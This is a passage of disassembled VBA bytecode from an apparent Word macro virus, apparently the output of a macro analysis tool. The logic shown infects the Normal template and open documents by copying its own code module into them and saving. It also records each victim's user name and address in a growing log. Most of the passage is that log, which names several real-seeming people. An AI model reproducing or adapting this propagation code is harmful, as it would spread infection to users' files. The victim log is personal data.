' 	PrintItemNL 
' Line #51:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "read "
' 	Ld LogFile 
' 	Concat 
' 	PrintItemNL 
' Line #52:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #53:
' Line #54:
' 	LitVarSpecial (True)
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x0007 "LogFile"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #55:
' Line #56:
' 	EndIfBlock 
' Line #57:
' Line #58:
' Line #59:
' 	QuoteRem 0x0000 0x004D "Make sure that some conditions are true before we continue infecting anything"
' Line #60:
' 	LineCont 0x0014 08 00 03 00 0F 00 03 00 17 00 03 00 1E 00 03 00 25 00 03 00
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	Paren 
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #61:
' Line #62:
' Line #63:
' 	QuoteRem 0x0002 0x0019 "Infect the NormalTemplate"
' Line #64:
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #65:
' Line #66:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St SaveNormalTemplate 
' Line #67:
' Line #68:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St OurCode 
' Line #69:
' Line #70:
' Line #71:
' 	QuoteRem 0x0004 0x0031 "Write a log file of this NormalTemplate infection"
' Line #72:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd UserAddress 
' 	FnLen 
' 	For 
' Line #73:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	IfBlock 
' Line #74:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	IfBlock 
' Line #75:
' 	Ld UserAddress 
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St UserAddress 
' Line #76:
' 	EndIfBlock 
' Line #77:
' 	ElseBlock 
' Line #78:
' 	Ld UserAddress 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	St UserAddress 
' Line #79:
' 	EndIfBlock 
' Line #80:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #81:
' Line #82:
' 	LineCont 0x001C 09 00 0E 00 12 00 0E 00 1B 00 0E 00 24 00 0E 00 2D 00 15 00 39 00 0E 00 44 00 0E 00
' 	Ld OurCode 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	LitStr 0x0015 "* DSR & FHS , KGU EMF"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	LitStr 0x0022 "00:15:54  -  Wednesday, 22.12.1999"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	LitStr 0x0029 "KZ, Kostanai, KGU EMF Applied Mathematics"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Time 
' 	LitStr 0x000B "hh:mm:ss - "
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	Ld Date 
' 	LitStr 0x0010 "dddd, d mmm yyyy"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld UserAddress 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St OurCode 
' Line #83:
' Line #84:
' Line #85:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #86:
' 	Ld OurCode 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #87:
' Line #88:
' 	Ld SaveNormalTemplate 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #89:
' Line #90:
' 	EndIfBlock 
' Line #91:
' Line #92:
' Line #93:
' 	QuoteRem 0x0002 0x0019 "Infect the ActiveDocument"
' Line #94:
' 	LineCont 0x0004 05 00 05 00
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld DocumentInfected 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #95:
' Line #96:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St SaveDocument 
' Line #97:
' Line #98:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St OurCode 
' Line #99:
' Line #100:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #101:
' 	Ld OurCode 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #102:
' Line #103:
' 	Ld SaveDocument 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #104:
' Line #105:
' 	EndIfBlock 
' Line #106:
' Line #107:
' Line #108:
' 	EndIfBlock 
' Line #109:
' Line #110:
' 	EndSub 
' Line #111:
' Line #112:
' 	QuoteRem 0x0000 0x000C " Logfile -->"
' Line #113:
' Line #114:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #115:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #116:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #117:
' 	QuoteRem 0x0000 0x001D " 19:20:14 - среда, 3 май 2000"
' Line #118:
' 	QuoteRem 0x0000 0x001E " Пожелал  остаться неизвестным"
' Line #119:
' 	QuoteRem 0x0000 0x0000 ""
' Line #120:
' Line #121:
' Line #122:
' Line #123:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #124:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #125:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #126:
' 	QuoteRem 0x0000 0x0024 " 11:36:42 - воскресенье, 14 май 2000"
' Line #127:
' 	QuoteRem 0x0000 0x0010 " Khudyakov Yuriy"
' Line #128:
' 	QuoteRem 0x0000 0x0000 ""
' Line #129:
' Line #130:
' Line #131:
' Line #132:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #133:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #134:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #135:
' 	QuoteRem 0x0000 0x0024 " 16:27:56 - понедельник, 15 май 2000"
' Line #136:
' 	QuoteRem 0x0000 0x0009 " Худякова"
' Line #137:
' 	QuoteRem 0x0000 0x0000 ""
' Line #138:
' Line #139:
' Line #140:
' Line #141:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #142:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #143:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #144:
' 	QuoteRem 0x0000 0x0020 " 16:55:46 - вторник, 16 май 2000"
' Line #145:
' 	QuoteRem 0x0000 0x0009 " Худякова"
' Line #146:
' 	QuoteRem 0x0000 0x0000 ""
' Line #147:
' Line #148:
' Line #149:
' Line #150:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #151:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #152:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #153:
' 	QuoteRem 0x0000 0x001E " 10:25:20 - среда, 17 май 2000"
' Line #154:
' 	QuoteRem 0x0000 0x0009 " Худякова"
' Line #155:
' 	QuoteRem 0x0000 0x0000 ""
' Line #156:
' Line #157:
' Line #158:
' Line #159:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #160:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #161:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #162:
' 	QuoteRem 0x0000 0x001E " 10:48:08 - среда, 17 май 2000"
' Line #163:
' 	QuoteRem 0x0000 0x0009 " Худякова"
' Line #164:
' 	QuoteRem 0x0000 0x0000 ""
' Line #165:
' Line #166:
' Line #167:
' Line #168:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #169:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #170:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #171:
' 	QuoteRem 0x0000 0x001E " 10:53:13 - среда, 17 май 2000"
' Line #172:
' 	QuoteRem 0x0000 0x0009 " Худякова"
' Line #173:
' 	QuoteRem 0x0000 0x0000 ""
' Line #174:
' Line #175:
' Line #176:
' Line #177:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #178:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #179:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #180:
' 	QuoteRem 0x0000 0x001E " 15:46:39 - среда, 17 май 2000"
' Line #181:
' 	QuoteRem 0x0000 0x0009 " Худякова"
' Line #182:
' 	QuoteRem 0x0000 0x0000 ""
' Line #183:
' Line #184:
' Line #185:
' Line #186:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #187:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #188:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #189:
' 	QuoteRem 0x0000 0x0020 " 15:10:05 - четверг, 18 май 2000"
' Line #190:
' 	QuoteRem 0x0000 0x0009 " Худякова"
' Line #191:
' 	QuoteRem 0x0000 0x0000 ""
' Line #192:
' Line #193:
' Line #194:
' Line #195:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #196:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #197:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #198:
' 	QuoteRem 0x0000 0x0024 " 13:25:39 - понедельник, 29 май 2000"
' Line #199:
' 	QuoteRem 0x0000 0x0009 " Худякова"
' Line #200:
' 	QuoteRem 0x0000 0x0000 ""
' Line #201:
' Line #202:
' Line #203:
' Line #204:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #205:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #206:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #207:
' 	QuoteRem 0x0000 0x0020 " 11:10:40 - вторник, 30 май 2000"
' Line #208:
' 	QuoteRem 0x0000 0x0009 " Худякова"
' Line #209:
' 	QuoteRem 0x0000 0x0000 ""
' Line #210:
' Line #211:
' Line #212:
' Line #213:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #214:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #215:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #216:
' 	QuoteRem 0x0000 0x001E " 11:26:48 - среда, 31 май 2000"
' Line #217:
' 	QuoteRem 0x0000 0x0009 " Худякова"
' Line #218:
' 	QuoteRem 0x0000 0x0000 ""
' Line #219:
' Line #220:
' Line #221:
' Line #222:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #223:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #224:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #225:
' 	QuoteRem 0x0000 0x001E " 17:05:35 - среда, 31 май 2000"
' Line #226:
' 	QuoteRem 0x0000 0x0009 " Худякова"
' Line #227:
' 	QuoteRem 0x0000 0x0000 ""
' Line #228:
' Line #229:
' Line #230:
' Line #231:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #232:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #233:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #234:
' 	QuoteRem 0x0000 0x001F " 11:00:58 - четверг, 1 июн 2000"
' Line #235:
' 	QuoteRem 0x0000 0x0009 " Худякова"
' Line #236:
' 	QuoteRem 0x0000 0x0000 ""
' Line #237:
' Line #238:
' Line #239:
' Line #240:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #241:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #242:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #243:
' 	QuoteRem 0x0000 0x001F " 15:12:39 - четверг, 1 июн 2000"
' Line #244:
' 	QuoteRem 0x0000 0x0009 " Худякова"
' Line #245:
' 	QuoteRem 0x0000 0x0000 ""
' Line #246:
' Line #247:
' Line #248:
' Line #249:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #250:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #251:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #252:
' 	QuoteRem 0x0000 0x001F " 09:53:15 - пятница, 2 июн 2000"
' Line #253:
' 	QuoteRem 0x0000 0x0009 " Худякова"
' Line #254:
' 	QuoteRem 0x0000 0x0000 ""
' Line #255:
' Line #256:
' Line #257:
' Line #258:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #259:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #260:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #261:
' 	QuoteRem 0x0000 0x0023 " 15:30:05 - воскресенье, 4 июн 2000"
' Line #262:
' 	QuoteRem 0x0000 0x0009 " Худякова"
' Line #263:
' 	QuoteRem 0x0000 0x0000 ""
' Line #264:
' Line #265:
' Line #266:
' Line #267:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #268:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #269:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #270:
' 	QuoteRem 0x0000 0x0023 " 15:05:21 - понедельник, 5 июн 2000"
' Line #271:
' 	QuoteRem 0x0000 0x0010 " Khudyakov Yuriy"
' Line #272:
' 	QuoteRem 0x0000 0x0000 ""
' Line #273:
' Line #274:
' Line #275:
' Line #276:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #277:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #278:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #279:
' 	QuoteRem 0x0000 0x001F " 15:29:43 - четверг, 8 июн 2000"
' Line #280:
' 	QuoteRem 0x0000 0x0007 " Андрей"
' Line #281:
' 	QuoteRem 0x0000 0x0000 ""
' Line #282:
' Line #283:
' Line #284:
' Line #285:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #286:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #287:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #288:
' 	QuoteRem 0x0000 0x001F " 11:14:45 - пятница, 9 июн 2000"
' Line #289:
' 	QuoteRem 0x0000 0x0007 " Андрей"
' Line #290:
' 	QuoteRem 0x0000 0x0000 ""
' Line #291:
' Line #292:
' Line #293:
' Line #294:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #295:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #296:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #297:
' 	QuoteRem 0x0000 0x001F " 11:35:08 - пятница, 9 июн 2000"
' Line #298:
' 	QuoteRem 0x0000 0x0007 " Андрей"
' Line #299:
' 	QuoteRem 0x0000 0x0000 ""
' Line #300:
' Line #301:
' Line #302:
' Line #303:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #304:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #305:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #306:
' 	QuoteRem 0x0000 0x001F " 11:35:46 - пятница, 9 июн 2000"
' Line #307:
' 	QuoteRem 0x0000 0x0007 " Андрей"
' Line #308:
' 	QuoteRem 0x0000 0x0000 ""
' Line #309:
' Line #310:
' Line #311:
' Line #312:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #313:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #314:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #315:
' 	QuoteRem 0x0000 0x001F " 11:36:21 - пятница, 9 июн 2000"
' Line #316:
' 	QuoteRem 0x0000 0x0007 " Андрей"
' Line #317:
' 	QuoteRem 0x0000 0x0000 ""
' Line #318:
' Line #319:
' Line #320:
' Line #321:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #322:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #323:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #324:
' 	QuoteRem 0x0000 0x001F " 11:37:01 - пятница, 9 июн 2000"
' Line #325:
' 	QuoteRem 0x0000 0x0007 " Андрей"
' Line #326:
' 	QuoteRem 0x0000 0x0000 ""
' Line #327:
' Line #328:
' Line #329:
' Line #330:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #331:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #332:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #333:
' 	QuoteRem 0x0000 0x001F " 11:37:29 - пятница, 9 июн 2000"
' Line #334:
' 	QuoteRem 0x0000 0x0007 " Андрей"
' Line #335:
' 	QuoteRem 0x0000 0x0000 ""
' Line #336:
' Line #337:
' Line #338:
' Line #339:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #340:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #341:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #342:
' 	QuoteRem 0x0000 0x001F " 11:38:06 - пятница, 9 июн 2000"
' Line #343:
' 	QuoteRem 0x0000 0x0007 " Андрей"
' Line #344:
' 	QuoteRem 0x0000 0x0000 ""
' Line #345:
' Line #346:
' Line #347:
' Line #348:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #349:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #350:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #351:
' 	QuoteRem 0x0000 0x001F " 11:38:38 - пятница, 9 июн 2000"
' Line #352:
' 	QuoteRem 0x0000 0x0007 " Андрей"
' Line #353:
' 	QuoteRem 0x0000 0x0000 ""
' Line #354:
' Line #355:
' Line #356:
' Line #357:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #358:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #359:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #360:
' 	QuoteRem 0x0000 0x001F " 11:39:26 - пятница, 9 июн 2000"
' Line #361:
' 	QuoteRem 0x0000 0x0007 " Андрей"
' Line #362:
' 	QuoteRem 0x0000 0x0000 ""
' Line #363:
' Line #364:
' Line #365:
' Line #366:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #367:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #368:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #369:
' 	QuoteRem 0x0000 0x001F " 11:40:12 - пятница, 9 июн 2000"
' Line #370:
' 	QuoteRem 0x0000 0x0007 " Андрей"
' Line #371:
' 	QuoteRem 0x0000 0x0000 ""
' Line #372:
' Line #373:
' Line #374:
' Line #375:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #376:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #377:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #378:
' 	QuoteRem 0x0000 0x001F " 11:40:46 - пятница, 9 июн 2000"
' Line #379:
' 	QuoteRem 0x0000 0x0007 " Андрей"
' Line #380:
' 	QuoteRem 0x0000 0x0000 ""
' Line #381:
' Line #382:
' Line #383:
' Line #384:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #385:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #386:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #387:
' 	QuoteRem 0x0000 0x001F " 11:41:29 - пятница, 9 июн 2000"
' Line #388:
' 	QuoteRem 0x0000 0x0007 " Андрей"
' Line #389:
' 	QuoteRem 0x0000 0x0000 ""
' Line #390:
' Line #391:
' Line #392:
' Line #393:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #394:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #395:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #396:
' 	QuoteRem 0x0000 0x001F " 11:42:03 - пятница, 9 июн 2000"
' Line #397:
' 	QuoteRem 0x0000 0x0007 " Андрей"
' Line #398:
' 	QuoteRem 0x0000 0x0000 ""
' Line #399:
' Line #400:
' Line #401:
' Line #402:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #403:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #404:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #405:
' 	QuoteRem 0x0000 0x001F " 11:43:04 - пятница, 9 июн 2000"
' Line #406:
' 	QuoteRem 0x0000 0x0007 " Андрей"
' Line #407:
' 	QuoteRem 0x0000 0x0000 ""
' Line #408:
' Line #409:
' Line #410:
' Line #411:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #412:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #413:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #414:
' 	QuoteRem 0x0000 0x001F " 11:43:50 - пятница, 9 июн 2000"
' Line #415:
' 	QuoteRem 0x0000 0x0007 " Андрей"
' Line #416:
' 	QuoteRem 0x0000 0x0000 ""
' Line #417:
' Line #418:
' Line #419:
' Line #420:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #421:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #422:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #423:
' 	QuoteRem 0x0000 0x001F " 11:46:52 - пятница, 9 июн 2000"
' Line #424:
' 	QuoteRem 0x0000 0x0007 " Андрей"
' Line #425:
' 	QuoteRem 0x0000 0x0000 ""
' Line #426:
' Line #427:
' Line #428:
' Line #429:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #430:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #431:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #432:
' 	QuoteRem 0x0000 0x001F " 14:02:12 - пятница, 9 июн 2000"
' Line #433:
' 	QuoteRem 0x0000 0x0007 " Андрей"
' Line #434:
' 	QuoteRem 0x0000 0x0000 ""
' Line #435:
' Line #436:
' Line #437:
' Line #438:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #439:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #440:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #441:
' 	QuoteRem 0x0000 0x001F " 15:39:23 - пятница, 9 июн 2000"
' Line #442:
' 	QuoteRem 0x0000 0x0007 " Андрей"
' Line #443:
' 	QuoteRem 0x0000 0x0000 ""
' Line #444:
' Line #445:
' Line #446:
' Line #447:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #448:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #449:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #450:
' 	QuoteRem 0x0000 0x0020 " 09:50:11 - суббота, 10 июн 2000"
' Line #451:
' 	QuoteRem 0x0000 0x0007 " Андрей"
' Line #452:
' 	QuoteRem 0x0000 0x0000 ""
' Line #453:
' Line #454:
' Line #455:
' Line #456:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #457:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #458:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #459:
' 	QuoteRem 0x0000 0x0020 " 18:43:32 - суббота, 24 июн 2000"
' Line #460:
' 	QuoteRem 0x0000 0x0007 " Klient"
' Line #461:
' 	QuoteRem 0x0000 0x0000 ""
' Line #462:
' Line #463:
' Line #464:
' Line #465:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #466:
